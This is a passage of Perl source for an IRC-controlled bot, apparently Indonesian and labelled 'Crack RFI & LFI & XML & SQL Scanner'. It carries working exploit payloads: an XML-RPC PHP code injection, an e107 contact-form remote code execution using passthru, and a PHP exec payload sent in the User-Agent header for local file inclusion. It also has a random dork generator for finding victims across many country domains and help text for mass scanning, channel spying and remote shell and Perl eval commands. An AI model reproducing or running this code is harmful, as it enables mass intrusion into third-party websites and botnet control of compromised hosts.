sub cek_respon {
  my $chan = $_[0];
  my ($q1,$q2) = (bukasitus($Ckrid),bukasitus($Ckrid2));
  my ($rid,$rid2,$stat);
  if ( $q1 =~ /Ckrid/ ) { $rid = "OK"; $stat = 1; } else { $rid = "ERROR!"; $stat = 0; }
  if ( $q2 =~ /Ckrid2/ ) { $rid2 = "OK"; $stat += 1; } else { $rid2 = "ERROR!"; $stat += 0; }
  $lfiid2  = bukasitus($Ckrid2);
  $lfisprd = bukasitus($spread);$lfisprd2 = bukasitus($spread2);
  irc_msg($chan,$colz{14}."Ckrid:".$colz{4}." $rid ".$colz{14}."Ckrid2:".$colz{4}." $rid2 ".$colz{14}."LFI (Useragent):".$colz{4}." CasperKae");
  return $stat;
}

##[ CEK DORK ]##
sub cek_dork {
  my $dork = $_[0];
  foreach my $d (@baddorkz) { if ($dork =~ /$d/) { return 1; } }
  return 0;
}

##[ CEK BUG ]##
sub cek_bug {
  my $bug = $_[0];
  foreach my $b (@badbugz) { if ($bug =~ /$b/) { return 1; } }
  return 0;
}

##[ RUTIN PENANGANAN FILE ]##
sub f_hapus { my $file = $_[0]; system("rm $file"); }
sub f_simpan {
  my ($nf,$hc) = @_;
  my $fh;
  open( $fh, ">>", $nf );
  my @slink = lnk_sub($hc);
  foreach my $s (@slink) { print $fh "$s\n"; }
  close $fh;
}
sub f_simpan2 {
  my ($nf,$isi) = @_;
  my $fh;
  open( $fh, ">", $nf ); print $fh "$isi\n"; close $fh;
}
sub f_simpan2b {
  my ($nf,$isi) = @_;
  my $fh;
  open( $fh, ">>", $nf ); print $fh "$isi\n"; close $fh;
}

##[ HTTP QUERY ]##
sub bukasitus {
  my $url = $_[0];
  my $request = HTTP::Request->new(GET => $url);
  my $ua  = LWP::UserAgent->new;
  $ua->timeout($conf{timeout});
  $ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6');
  my $response = $ua->request($request);
  if ($response->is_success) { return $response->content; }
  else { return $response->status_line; }
}
sub bukasitus2 {
  my $url = $_[0];
  my $ua  = LWP::UserAgent->new;
  $ua->timeout($conf{timeout});
  $ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6');
  my $response = $ua->get($url);
  if ($response->is_success) { return $response->content; }
  else { return $response->status_line; }
}
sub bukasituscrxml {
  my $url  = $_[0];
  my $crMa = $_[1];
  my $exploit;
  my $ua  = LWP::UserAgent->new;
  $ua->timeout($conf{timeout});
  $ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6');
        $exploit  = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'casper';echo`".$crMa."`;echo'kae';exit;/*</name></value></param></params></methodCall>";
  my $response = $ua->request(POST $url,Content_Type => 'text/xml',Content => $exploit);
  if ($response->is_success) { return $response->content; }
  else { return $response->status_line; }
}
sub bukasituscre107 {
	my $inc  = $_[0];
	my $crMe = $_[1];
	if($crMe =~ /CASPER VURN/){ $crMe = "echo('casper'.php_uname().'kae')"; }else{ $crMe = "echo('casper ');passthru('".$crMe."');echo(' kae')"; }
        my $ua = LWP::UserAgent->new or die;
        $ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6');
        $ua->timeout($conf{timeout});

        my $req = HTTP::Request->new(POST => $inc);
        $req->content_type('application/x-www-form-urlencoded');
        $req->content("send-contactus=1&author_name=%5Bphp%5D" .$crMe. "%3Bdie%28%29%3B%5B%2Fphp%5D");

        my $res = $ua->request($req);
        print $inc;	
	if($res->is_success) { 
		return $res->content;
	} else {
		return $res->status_line;
	}
}
sub bukasituscre107spred {
	my $inc  = $_[0];
	my $crMe = $_[1];
        my $ua = LWP::UserAgent->new or die;
        $ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6');
        $ua->timeout($conf{timeout});

        my $req = HTTP::Request->new(POST => $inc);
        $req->content_type('application/x-www-form-urlencoded');
        $req->content("send-contactus=1&author_name=%5Bphp%5D" .$crMe. "%3Bdie%28%29%3B%5B%2Fphp%5D");

        my $res = $ua->request($req);
        print $inc;	
	if($res->is_success) { 
		return $res->content;
	} else {
		return $res->status_line;
	}
}
sub bukasitus3 {
  my $url = $_[0];
  my $host  = $url;
  my $query = $url;
  my $isi; my $kirim;
  my $uagent  = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6";
  $host  =~ s/http:\/\/([-a-zA-Z0-9\.]+)\/.*/$1/;
  $query =~ s/$host//;
  eval {
    my $sock = IO::Socket::INET->new(PeerAddr => "$host",PeerPort => "80",Proto => "tcp") || return;
    $kirim = "GET ".$query." HTTP/1.1\r\nHost: ".$host."\r\nAccept: */*\r\nUser-Agent: ".$uagent."\r\n\r\n";
    print $sock $kirim;
    my @r = <$sock>;
    $isi = "@r";
    close($sock);
  };
  return $isi;
}
sub bukasituslfi {
    my $url = $_[0];
    my $agent = $lfiid2;
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout($conf{timeout});
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}
sub bukasituslfisprd {
    my $url = $_[0];
    my $agent = $lfisprd;
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout($conf{timeout});
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}
sub bukasituslfisprd2 {
    my $url = $_[0];
    my $agent = $lfisprd2;
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout($conf{timeout});
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}
sub bukasituslficmd {
    my $url = $_[0];
    my $agent = "<?php echo \"crack#\"; exec(\'".$cmdlfiu."\'); echo \"#nobita\"; ?>";
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout($conf{timeout});
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}
sub SiteDomains { 
my @dom      = ("*.ru","*.pl","*.biz","*.tv","*.info","*.org","*.net","*.ae","*.ar","*.at","*.au","*.be","*.br","*.ca","*.ch","*.cl","*.de","*.dk","*.fi","*.fr","*.gr","*.hk","*.ie","*.il","*.it","*.jp","*.kr","*.lt","*.lv","*.nl","*.pa","*.pe","*.pl","*.pt","*.ru","*.sg","*.tr","*.tw","*.ua","*.uk","*.hu","*.af","*.ae","*.ag","*.ai","*.am","*.ar","*.as","*.at","*.au","*.az","*.ba","*.bd","*.be","*.bg","*.bh","*.bi","*.bn","*.bo","*.bn","*.bs","*.bw","*.by","*.bz","*.ca","*.cd","*.cg","*.ch","*.ci","*.ck","*.cl","*.cn","*.co","*.cr","*.cu","*.cz","*.de","*.dj","*.dk","*.dm","*.do","*.ec","*.ee","*.eg","*.es","*.et","*.fi","*.fj","*.fm","*.fr","*.ge","*.gg","*.gi","*.gl","*.gm","*.gp","*.gr","*.gt","*.gy","*.hk","*.hn","*.hr","*.ht","*.hu","*.id","*.ie","*.il","*.im","*.in","*.is","*.it","*.je","*.jm","*.jo","*.jp","*.ke","*.kh","*.ki","*.kg","*.kr","*.kz","*.la","*.li","*.lk","*.ls","*.lt","*.lu","*.lv","*.ly","*.ma","*.md","*.mn","*.ms","*.mt","*.mu","*.mv","*.mw","*.mx","*.my","*.na","*.nf","*.ng","*.ni",
		"*.nl","*.no","*.np","*.nr","*.nu","*.nz","*.om","*.pa","*.pe","*.ph","*.pk","*.pl","*.pn","*.pr","*.pt","*.py","*.qa","*.ro","*.ru","*.rw","*.sa","*.sb","*.sc","*.se","*.sg","*.sh","*.si","*.sk","*.sn","*.sm","*.st","*.sv","*.th","*.tj","*.tk","*.tm","*.to","*.tp","*.tr","*.tt","*.tw","*.ua","*.ug","*.uk","*.uy","*.uz","*.vc","*.ve","*.vg","*.vi","*.vn","*.vu","*.ws","*.yu","*.za","*.zm","*.zw");
my @thS      = ("2000","2001","2002","2003","2004","2005","2006","2007","2008","2009","2010","1999","1998","1997","1996","1995");
my @dorkzcr  = ("username","password","member","login","admin","comment","email");
my @autodoms = (
		$dom[rand(scalar(@dom))],
		$thS[rand(scalar(@thS))],
		$dom[rand(scalar(@dom))],
		$dorkzcr[rand(scalar(@dorkzcr))],
		$dom[rand(scalar(@dom))],
		$thS[rand(scalar(@thS))],
		$dom[rand(scalar(@dom))],
		$thS[rand(scalar(@thS))],
		$dom[rand(scalar(@dom))],
		$dorkzcr[rand(scalar(@dorkzcr))],
		$dom[rand(scalar(@dom))]
		);
    return @autodoms;
} 

##[ ENCODE/DECODE ]##
sub htmltourl { my $str = $_[0]; $str =~ s/&amp;/&/g; return $str; }
sub links() {
    my @l;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push( @l, $link, $host, $hdir );
    return @l;
}
sub urlen {
  my $str = $_[0];
  #$str =~ s/\+/\%2B/g;
  $str =~ s/ /\+/g;
  $str =~ s/@/\%40/g;
  $str =~ s/\//\%2F/g;
  $str =~ s/&/\%26/g;
  $str =~ s/\"/\%22/g;
  $str =~ s/,/\%2C/g;
  $str =~ s/\\/\%5C/g;
  $str =~ s/:/\%3A/g;
  $str =~ s/\[/\%5B/g;
  $str =~ s/\]/\%5D/g;
  $str =~ s/\?/\%3F/g;
  $str =~ s/\=/\%3D/g;
  $str =~ s/\|/\%7C/g;
  return $str;
}
sub urlde {
  my $str = $_[0];
  $str =~ s/\+/ /g;
  $str =~ s/\%2B/\+/g;
  $str =~ s/\%40/@/g;
  $str =~ s/\%2E/\./g;
  $str =~ s/\%2F/\//g;
  $str =~ s/\%26/&/g;
  $str =~ s/\%22/\"/g;
  $str =~ s/\%2C/,/g;
  $str =~ s/\%5C/\\/g;
  $str =~ s/\%3A/:/g;
  $str =~ s/\%5[B|b]/\[/g;
  $str =~ s/\%5[D|d]/\]/g;
  $str =~ s/\%3F/\?/g;
  $str =~ s/\%3D/\=/g;
  $str =~ s/\%7C/\|/g;
  return $str;
}
sub cryptz { return crypt($_[0],"Casper_Kae"); }

##[ TRIMMER CRLF ]##
sub trimrn {
  my $str = $_[0];
  if (!$str) { return ""; }
  $str =~ s/\r// if ($str);
  $str =~ s/\n//;
  return $str;
}

##[ INFO BOT ]##
sub bot_info   {
  my $chan   = $_[0];
  my $hlogo  = " [".$colz{12}."!".$colz{1}."] ".$colz{14};
  my $uname  = `uname -a`;
  my $uid    = `id`;
  my $uptime = `uptime`;
  my @info   = (
  $hlogo."Crack RFI & LFI & XML & SQL Scanner $versi Info ",
  $hlogo."Written under ActivePerl 0.0 Build 1x by Alert [Crack Crew] ",
  $hlogo."Uname: $colz{13} $uname ",
  $hlogo."Uid: .$colz{13} $uid ",
  $hlogo."Uptime: .$colz{13} $uptime ",
  );
  foreach my $m(@info) { irc_msg($chan,$m); }
}

##[ HELP BOT ]##
sub bot_help {
  my ($chan,$level) = @_;
  my $hsepz = "[".$colz{12}."!".$colz{1}."] ".$colz{14};
  my $hlogo = "[".$colz{12}."!".$colz{1}."] ".$colz{13}.$cmdpre.$colz{14};
  my $hcspr = "[".$colz{12}."!".$colz{1}."] ".$colz{13}.$bot{nick}.$colz{14}." ";
  my @help; my $i;
  my @hlp1 = (
  $hsepz."Crack RFI & LFI & XML & SQL Scanner $versi Help",
  $hlogo."scan|scan2 <bug> <dork> ? Memulai scanner | scanner & Eksploit RFI & LFI & XML & SQL",
  $hcspr."scan <bug> <dork> ? Memulai scanner & Eksploit RFI & LFI",
  $hcspr."xml <bug> <dork> ? Memulai scanner & Eksploit XML",
  $hcspr."e107 <bug> <dork> ? Memulai scanner & Eksploit e107 RCE",
  $hcspr."sql <bug> <dork> ? Memulai scanner & Eksploit SQL",
  $hcspr."sqli -h ? Melihat bantuan scemafuze SQL",
  $hlogo."milw0rm <keywords> ? Mencari daftar bug di milw0rm",
  $hlogo."cmdlfi <LFI target> <comand> ? execute target LFI",
  $hlogo."cmdrfi <RFI target> <comand> ? execute target RFI",
  $hlogo."cmdxml <XML target> <comand> ? execute target XML",
  $hlogo."cmde107 <XML target> <comand> ? execute target e107 RCE",
  $hlogo."ip <ip> ? cek ip",
  $hlogo."zip <zip> ? cek zip/post code",
  $hlogo."text[enc/dec] <text> ? encrypt/decrypt text",
  $hlogo."respon ? Cek Respon & Injector RFI & User Agent LFI",
  $hlogo."urlen|urlde <teks> ? Encoder/Decoder URL",
  $hlogo."cek <target> ? Cek RFI & LFI & XML & SQL target",
  $hlogo."info ? Informasi bot",
  $hlogo."auth <password> ? Login ke bot",
  );
  my @hlp2 = (
  $hsepz."User Commands: ",
  $hlogo."joomla <bug> <dork> ? Memulai scanner & Eksploit RFI & LFI & XML & SQL Joomla",
  $hlogo."hitung <jumlah> ? Mengganti hitungan proses eksploitasi",
  $hlogo."cryptz <password> ? Membuat password yg terenkripsi",
  $hlogo."join|part <channel> ? Join/Part channel",
  $hlogo."nick <nick> ? Ganti nick bot",
  $hlogo."logout ? Logout dari bot",
  );
  my @hlp3 = (
  $hsepz."Admin Commands:",
  $hlogo."crespon[1/2]|cshell|cspread <url> ? Mengganti respon/injector/spread/spread2 RFI",
  $hlogo."cshurl <url> ? Mengganti injector (Ckrid1.txt,Ckrid2.txt,casper.txt,casper2.txt) RFI",
  $hlogo."rfipid <perintah> ? Mengganti RFI & LFI & XML & SQL PID",
  $hlogo."spy ? Menampilkan konfigurasi Spy",
  $hlogo."spyhost <your chan> ? Channel host buat spy",
  $hlogo."spychan <chan> ? Channel yang akan di spy",
  $hlogo."spyword <regex> ? Kata yg di akan spy",
  $hlogo."raw <perintah> ? Perintah Raw IRC",
  $hlogo."cmd <perintah shell> ? Mengeksekusi perintah di shell",
  $hlogo."eval <kode perl> ? Mengeksekusi kode perl",
  $hlogo."quit ? Quit dari IRC",
  $hlogo."keluar ? Quit dari IRC & Matikan semua proses Perl",
  );
  if    ( $level == 1 ) { push(@help,@hlp1); }
  elsif ( $level == 2 ) { push(@help,@hlp2); }
  elsif ( $level == 3 ) { push(@help,@hlp3); }
  foreach my $m (@help) { irc_msg($chan,$m); $i++; if ( $i % $conf{linez} == 0 ) { sleep($conf{sleepz}); } }
}

##[ CUSTOM MESSAGE ]##
sub msge { my ($chan,$se,$res)		= @_; irc_msg($chan," ".$se." ".$res." "); }
sub msgi { my ($chan,$judul,$info)	= @_; irc_msg($chan," [$judul] $info "); }
sub msgn { my ($chan,$se,$nxurl)	= @_; irc_msg($chan," ".$se." ".$nxurl." "); }
sub msgr { my ($chan,$se,$totr,$clr)	= @_; irc_msg($chan," ".$se." ".$totr." ".$clr." "); }
sub msgt { my ($chan,$se,$res)		= @_; irc_msg($chan," ".$se." ".$res." "); }
sub ntci { my ($chan,$judul,$info)	= @_; irc_ntc($chan," [$judul] $info "); }

##[ PERINTAH RAW IRC ]##
sub irc_raw  { my $data		= $_[0]; print $sock "$data\r\n"; }
sub irc_pasv { my $pasv		= $_[0]; irc_raw("PASS $pasv"); }
sub irc_nick { my $nick		= $_[0]; irc_raw("NICK $nick"); }
sub irc_user { my $ident	= $_[0]; irc_raw("USER $ident localhost * : $versi"); }
sub irc_msg  { my ($to,$psn)	= @_; irc_raw("PRIVMSG $to :$psn"); }
sub irc_act  { my ($to,$psn)	= @_; irc_raw("PRIVMSG $to :ACTION $psn"); }
sub irc_ntc  { my ($to,$psn)	= @_; irc_raw("NOTICE $to :$psn"); }
sub irc_join { my $to		= $_[0]; irc_raw("JOIN $to"); }
sub irc_part { my $to		= $_[0]; irc_raw("PART $to"); }
sub irc_quit { my $psn		= $_[0]; irc_raw("QUIT :$psn"); exit; }

##############################
##[ CasperKae CRACKED CREW ]##
##############################